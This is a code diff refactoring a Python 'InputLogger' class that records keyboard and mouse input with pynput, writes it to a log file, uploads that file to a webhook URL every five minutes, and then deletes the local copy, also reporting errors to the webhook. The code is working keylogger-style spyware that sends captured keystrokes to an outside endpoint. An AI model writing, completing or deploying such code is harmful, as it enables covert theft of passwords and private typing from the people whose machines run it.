@@ -1,12 +1,13 @@
-from main import SOFTWARE_DIR_NAME, WEBHOOK_URL
 from utils import *
 
 from pynput import keyboard, mouse
 import time
 
 class InputLogger:
-    def __init__(self):
-        self.log_file = os.path.join(get_logs_path(SOFTWARE_DIR_NAME), "input_logs.txt")
+    def __init__(self, software_dir_name, webhook_url):
+        self.software_dir_name = software_dir_name
+        self.webhook_url = webhook_url
+        self.log_file = os.path.join(get_logs_path(self.software_dir_name), "input_log.txt")
         self.interval = 300 # once every 5 minutes
         self.current_logs = ""
 
@@ -33,8 +34,8 @@ class InputLogger:
                 with open(self.log_file, "w") as f:
                     f.write("Input Logs:\n\n")
                     f.write(self.current_logs)
-                send_webhook(WEBHOOK_URL, file={"input_logs.txt": open(self.log_file, "rb")})
+                send_webhook(self.webhook_url, file={"input_logs.txt": open(self.log_file, "rb")})
                 self.current_logs = ""
                 os.remove(self.log_file)
         except Exception as e:
-            send_webhook(WEBHOOK_URL, f"Error logging input: {e}")
+            send_webhook(self.webhook_url, f"Error logging input: {e}")
